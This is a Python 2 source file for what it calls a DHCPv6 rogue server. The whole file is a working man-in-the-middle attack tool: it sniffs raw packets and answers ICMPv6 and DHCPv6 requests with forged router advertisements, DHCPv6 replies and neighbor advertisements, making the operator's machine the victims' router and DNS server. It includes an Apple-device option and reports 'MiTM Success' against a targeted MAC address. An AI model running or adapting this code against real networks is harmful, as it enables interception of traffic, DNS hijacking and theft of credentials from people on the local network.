#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath
project_root_path = dirname(dirname(dirname(abspath(__file__))))
utils_path = project_root_path + "/Utils/"
path.append(utils_path)

from base import Base
from network import Ethernet_raw, IPv6_raw, ICMPv6_raw, UDP_raw, DHCPv6_raw
from sys import exit
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW, htons
from tm import ThreadManager
from random import randint
from time import sleep
# endregion

target_mac_address = None
target_ip_address = None
recursive_dns_address = None

need_neighbor_advertise = False
need_router_advertise = True
disable_dhcpv6 = False
dhcpv6_request_in_your_server = False
icmpv6_neighbor_solicit_your_ip = False
already_print_success_message = False

Base = Base()
Base.check_user()
Base.check_platform()

tm = ThreadManager(5)

parser = ArgumentParser(description='DHCPv6 Rogue server')

parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
parser.add_argument('-p', '--prefix', type=str, help='Set network prefix', default='fd00::/64')
parser.add_argument('-f', '--first_suffix_ip', type=str, help='Set first suffix client ip for offering', default='2')
parser.add_argument('-l', '--last_suffix_ip', type=str, help='Set last suffix client ip for offering', default='255')
parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)

parser.add_argument('-L', '--local_ipv6', type=str, help='Set client Link local IPv6 address with MAC in --target_mac',
                    default=None)
parser.add_argument('-G', '--global_ipv6', type=str, help='Set client Global IPv6 address with MAC in --target_mac',
                    default=None)

parser.add_argument('-D', '--disable_dhcpv6', action='store_true', help='Do not use DHCPv6 protocol')
parser.add_argument('-d', '--dns', type=str, help='Set recursive DNS IPv6 address', default=None)
parser.add_argument('-s', '--dns_search', type=str, help='Set DNS search list', default="test.com")
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
parser.add_argument('-a', '--apple', action='store_true', help='Apple devices MiTM')
args = parser.parse_args()

if not args.quiet:
    Base.print_banner()

eth = Ethernet_raw()
ipv6 = IPv6_raw()
icmpv6 = ICMPv6_raw()
udp = UDP_raw()
dhcpv6 = DHCPv6_raw()

if args.disable_dhcpv6:
    disable_dhcpv6 = True

if args.interface is None:
    Base.print_warning("Please set a network interface for sniffing ICMPv6 and DHCPv6 requests ...")
current_network_interface = Base.netiface_selection(args.interface)

global_socket = socket(AF_PACKET, SOCK_RAW)
global_socket.bind((current_network_interface, 0))

network_prefix = args.prefix
dns_search = args.dns_search

if args.target_mac is not None:
    target_mac_address = str(args.target_mac).lower()

ipv6_address = None
if args.global_ipv6 is not None:
    target_ip_address = args.global_ipv6
    ipv6_address = args.global_ipv6
else:
    ipv6_address = "fd00::1111"

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have MAC address!"
    exit(1)

your_ipv6_link_address = Base.get_netiface_ipv6_link_address(current_network_interface)
if your_ipv6_link_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have IPv6 link local address!"
    exit(1)

your_ipv6_glob_address = Base.get_netiface_ipv6_glob_address(current_network_interface)
if your_ipv6_glob_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have IPv6 global address!"
    exit(1)

if args.dns is None:
    recursive_dns_address = your_ipv6_glob_address
else:
    recursive_dns_address = args.dns

if not args.quiet:
    print Base.c_info + "Network interface: " + Base.cINFO + current_network_interface + Base.cEND
    print Base.c_info + "Your MAC address: " + Base.cINFO + your_mac_address + Base.cEND
    print Base.c_info + "Your IPv6 link local address: " + Base.cINFO + your_ipv6_link_address + Base.cEND
    if args.target_mac is not None:
        print Base.c_info + "Target MAC: " + Base.cINFO + args.target_mac + Base.cEND
    if args.local_ipv6 is not None:
        print Base.c_info + "Target Link local IPv6: " + Base.cINFO + args.local_ipv6 + Base.cEND
    if args.global_ipv6 is not None:
        print Base.c_info + "Target Global IPv6: " + Base.cINFO + args.global_ipv6 + Base.cEND
    else:
        print Base.c_info + "First suffix offer IP: " + Base.cINFO + args.first_suffix_ip + Base.cEND
        print Base.c_info + "Last suffix offer IP: " + Base.cINFO + args.last_suffix_ip + Base.cEND
    print Base.c_info + "Prefix: " + Base.cINFO + network_prefix + Base.cEND
    print Base.c_info + "Router IPv6 address: " + Base.cINFO + your_ipv6_link_address + Base.cEND
    print Base.c_info + "DNS IPv6 address: " + Base.cINFO + recursive_dns_address + Base.cEND
    print Base.c_info + "Domain search: " + Base.cINFO + dns_search + Base.cEND


def send_icmpv6_solicit_packets():
    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    while True:
        pkt = icmpv6.make_router_solicit_packet(ethernet_src_mac=your_mac_address,
                                                ipv6_src=your_ipv6_link_address,
                                                need_source_link_layer_address=True,
                                                source_link_layer_address=eth.get_random_mac())
        SOCK.send(pkt)
        sleep(0.1)


def send_dhcpv6_solicit_packets():
    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    while True:
        Client_DUID = dhcpv6.get_duid(eth.get_random_mac())
        request_options = [23, 24]

        pkt = dhcpv6.make_solicit_packet(ethernet_src_mac=your_mac_address,
                                         ipv6_src=your_ipv6_link_address,
                                         transaction_id=randint(1, 16777215),
                                         client_identifier=Client_DUID,
                                         option_request_list=request_options)
        SOCK.send(pkt)
        sleep(0.1)


def send_icmpv6_advertise_packets():
    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    if target_mac_address is not None:

        if args.local_ipv6 is None:
            target_ipv6_link_address = Base.create_ipv6_link_address(target_mac_address)
        else:
            target_ipv6_link_address = args.local_ipv6

        icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                   ethernet_dst_mac=target_mac_address,
                                                                   ipv6_src=your_ipv6_link_address,
                                                                   ipv6_dst=target_ipv6_link_address,
                                                                   dns_address=recursive_dns_address,
                                                                   domain_search=dns_search,
                                                                   prefix=network_prefix)
        if args.apple:
            if args.local_ipv6 is not None:
                while need_router_advertise:
                    SOCK.send(icmpv6_ra_packet)
                    sleep(0.1)
        else:
            while need_router_advertise:
                SOCK.send(icmpv6_ra_packet)
                sleep(0.1)

    SOCK.close()


def reply(request):

    # region Define global variables
    global global_socket
    global ipv6_address
    global need_neighbor_advertise
    global need_router_advertise
    global icmpv6_neighbor_solicit_your_ip
    global dhcpv6_request_in_your_server
    global already_print_success_message
    global disable_dhcpv6
    # endregion

    # region ICMPv6
    if 'ICMPv6' in request.keys():

        # region ICMPv6 Router Solicitation
        if request['ICMPv6']['type'] == 133:

            Base.print_info("ICMPv6 Router Solicitation request from: ", request['IPv6']['source-ip'] +
                            " (" + request['Ethernet']['source'] + ")")

            need_router_advertise = False

            icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                       ethernet_dst_mac=request['Ethernet']['source'],
                                                                       ipv6_src=your_ipv6_link_address,
                                                                       ipv6_dst=request['IPv6']['source-ip'],
                                                                       dns_address=recursive_dns_address,
                                                                       domain_search=dns_search,
                                                                       prefix=network_prefix)

            global_socket.send(icmpv6_ra_packet)
            Base.print_info("ICMPv6 Router Advertisement reply to: ", request['IPv6']['source-ip'] +
                            " (" + request['Ethernet']['source'] + ")")

        # endregion

        # region ICMPv6 Neighbor Solicitation
        if request['ICMPv6']['type'] == 135:
            if request['ICMPv6']['target-address'] != ipv6_address:
                if request['ICMPv6']['target-address'] is not None:
                    icmpv6_na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                                 ipv6_src=your_ipv6_link_address,
                                                                                 target_ipv6_address=request['ICMPv6']
                                                                                 ['target-address'])
                    for _ in range(5):
                        global_socket.send(icmpv6_na_packet)
                need_neighbor_advertise = False
            else:
                icmpv6_neighbor_solicit_your_ip = True
        # endregion

    # endregion

    # region DHCPv6
    if not disable_dhcpv6 and 'DHCPv6' in request.keys():

        # region DHCPv6 Solicit
        if request['DHCPv6']['message-type'] == 1:
            Base.print_info("DHCPv6 Solicit from: ", request['IPv6']['source-ip'] +
                            " (" + request['Ethernet']['source'] + ")",
                            " XID: ", hex(request['DHCPv6']['transaction-id']))

            # Get Client DUID time from Client Identifier DUID
            client_duid_time = 0
            for dhcpv6_option in request['DHCPv6']['options']:
                if dhcpv6_option['type'] == 1:
                    client_duid_time = dhcpv6_option['value']['duid-time']

            dhcpv6_advertise = dhcpv6.make_advertise_packet(ethernet_src_mac=your_mac_address,
                                                            ethernet_dst_mac=request['Ethernet']['source'],
                                                            ipv6_src=your_ipv6_link_address,
                                                            ipv6_dst=request['IPv6']['source-ip'],
                                                            transaction_id=request['DHCPv6']['transaction-id'],
                                                            dns_address=recursive_dns_address,
                                                            domain_search=dns_search,
                                                            ipv6_address=ipv6_address,
                                                            client_duid_timeval=client_duid_time)
            global_socket.send(dhcpv6_advertise)
            Base.print_info("DHCPv6 Advertise to: ", request['IPv6']['source-ip'] +
                            " (" + request['Ethernet']['source'] + ")")
        # endregion

        # region DHCPv6 Request
        if request['DHCPv6']['message-type'] == 3:

            # region Get Client DUID time, IPv6 address and Server MAC address
            client_duid_time = 0
            client_ipv6_address = None
            server_mac_address = None

            for dhcpv6_option in request['DHCPv6']['options']:
                if dhcpv6_option['type'] == 1:
                    client_duid_time = dhcpv6_option['value']['duid-time']
                if dhcpv6_option['type'] == 2:
                    server_mac_address = dhcpv6_option['value']['mac-address']
                if dhcpv6_option['type'] == 3:
                    client_ipv6_address = dhcpv6_option['value']['ipv6-address']
            # endregion

            if server_mac_address and client_ipv6_address is not None:

                Base.print_info("DHCPv6 Request from: ", request['IPv6']['source-ip'] +
                                " (" + request['Ethernet']['source'] + ")",
                                " XID: ", hex(request['DHCPv6']['transaction-id']),
                                " Server: ", server_mac_address,
                                " IAA: ", client_ipv6_address)

                if server_mac_address != your_mac_address:
                    need_neighbor_advertise = True
                else:
                    dhcpv6_request_in_your_server = True

                dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
                                                        ethernet_dst_mac=request['Ethernet']['source'],
                                                        ipv6_src=your_ipv6_link_address,
                                                        ipv6_dst=request['IPv6']['source-ip'],
                                                        transaction_id=request['DHCPv6']['transaction-id'],
                                                        dns_address=recursive_dns_address,
                                                        domain_search=dns_search,
                                                        ipv6_address=ipv6_address,
                                                        client_duid_timeval=client_duid_time)

                global_socket.send(dhcpv6_reply)
                Base.print_info("DHCPv6 Reply to: ", request['IPv6']['source-ip'] +
                                " (" + request['Ethernet']['source'] + ")")

        # endregion

        # # DHCPv6 Release
        # if request.haslayer(DHCP6_Release):
        #     print Base.c_info + "Sniff DHCPv6 Release from: " + request[IPv6].src + " (" + \
        #           request[Ether].src + ") TID: " + hex(request[DHCP6_Release].trid)
        #
        # # DHCPv6 Confirm
        # if request.haslayer(DHCP6_Confirm):
        #     print Base.c_info + "Sniff DHCPv6 Confirm from: " + request[IPv6].src + " (" + \
        #           request[Ether].src + ") TID: " + hex(request[DHCP6_Confirm].trid)
        #
        # # DHCPv6 Decline
        # if request.haslayer(DHCP6_Decline):
        #     print Base.c_warning + "Sniff DHCPv6 Decline from: " + request[IPv6].src + " (" + \
        #           request[Ether].src + ") TID: " + hex(request[DHCP6_Decline].trid) + \
        #           " IAADDR: " + request[DHCP6OptIAAddress].addr
        #     # print request.summary

    # endregion

    # region MiTM Success message
    if icmpv6_neighbor_solicit_your_ip and dhcpv6_request_in_your_server and not already_print_success_message:
        if target_ip_address is not None:
            print Base.c_success + "MiTM Success: " + target_ip_address + " (" + target_mac_address + ")"
            already_print_success_message = True
            exit(0)
    # endregion


if __name__ == "__main__":
    #tm.add_task(send_icmpv6_solicit_packets)
    #tm.add_task(send_icmpv6_advertise_packets)
    #tm.add_task(send_dhcpv6_solicit_packets)

    if args.global_ipv6 is not None:
        if args.target_mac is None:
            print Base.c_error + "Please set target MAC address (--target_mac 00:AA:BB:CC:DD:FF) for target IPv6!"
            exit(1)

    # region Create RAW socket for sniffing
    raw_socket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
    # endregion

    # region Print info message
    Base.print_info("Waiting for a ICMPv6 or DHCPv6 requests ...")
    # endregion

    # region Start sniffing
    while True:

        # region Try
        try:

            # region Sniff packets from RAW socket
            packets = raw_socket.recvfrom(2048)

            for packet in packets:

                # region Parse Ethernet header
                ethernet_header = packet[0:eth.header_length]
                ethernet_header_dict = eth.parse_header(ethernet_header)
                # endregion

                # region Could not parse Ethernet header - break
                if ethernet_header_dict is None:
                    break
                # endregion

                # region Ethernet filter
                if target_mac_address is not None:
                    if ethernet_header_dict['source'] != target_mac_address:
                        break
                else:
                    if ethernet_header_dict['source'] == your_mac_address:
                        break
                # endregion

                # region IPv6 packet

                # 34525 - Type of IP packet (0x86dd)
                if ethernet_header_dict['type'] == ipv6.header_type:

                    # region Parse IPv6 header
                    ipv6_header = packet[eth.header_length:eth.header_length + ipv6.header_length]
                    ipv6_header_dict = ipv6.parse_header(ipv6_header)
                    # endregion

                    # region Could not parse IPv6 header - break
                    if ipv6_header_dict is None:
                        break
                    # endregion

                    # region UDP
                    if ipv6_header_dict['next-header'] == udp.header_type:

                        # region Parse UDP header
                        udp_header_offset = eth.header_length + ipv6.header_length
                        udp_header = packet[udp_header_offset:udp_header_offset + udp.header_length]
                        udp_header_dict = udp.parse_header(udp_header)
                        # endregion

                        # region Could not parse UDP header - break
                        if udp_header is None:
                            break
                        # endregion

                        # region DHCPv6 packet

                        if udp_header_dict['destination-port'] == 547 and udp_header_dict['source-port'] == 546:

                            # region Parse DHCPv6 request packet
                            dhcpv6_packet_offset = udp_header_offset + udp.header_length
                            dhcpv6_packet = packet[dhcpv6_packet_offset:]
                            dhcpv6_packet_dict = dhcpv6.parse_packet(dhcpv6_packet)
                            # endregion

                            # region Could not parse DHCPv6 request packet - break
                            if dhcpv6_packet_dict is None:
                                break
                            # endregion

                            # region Call function with full DHCPv6 packet
                            reply({
                                "Ethernet": ethernet_header_dict,
                                "IPv6": ipv6_header_dict,
                                "UDP": udp_header_dict,
                                "DHCPv6": dhcpv6_packet_dict
                            })
                            # endregion

                        # endregion

                    # endregion

                    # region ICMPv6
                    if ipv6_header_dict['next-header'] == icmpv6.packet_type:

                        # region Parse ICMPv6 packet
                        icmpv6_packet_offset = eth.header_length + ipv6.header_length
                        icmpv6_packet = packet[icmpv6_packet_offset:]
                        icmpv6_packet_dict = icmpv6.parse_packet(icmpv6_packet)
                        # endregion

                        # region Could not parse ICMPv6 packet - break
                        if icmpv6_packet_dict is None:
                            break
                        # endregion

                        # region ICMPv6 filter
                        if icmpv6_packet_dict['type'] == 133 or 135:
                            pass
                        else:
                            break
                        # endregion

                        # region Call function with full ICMPv6 packet
                        reply({
                            "Ethernet": ethernet_header_dict,
                            "IPv6": ipv6_header_dict,
                            "ICMPv6": icmpv6_packet_dict
                        })
                        # endregion

                    # endregion

                # endregion

            # endregion

        # endregion

        # region Exception - KeyboardInterrupt
        except KeyboardInterrupt:
            Base.print_info("Exit")
            exit(0)
        # endregion

    # endregion

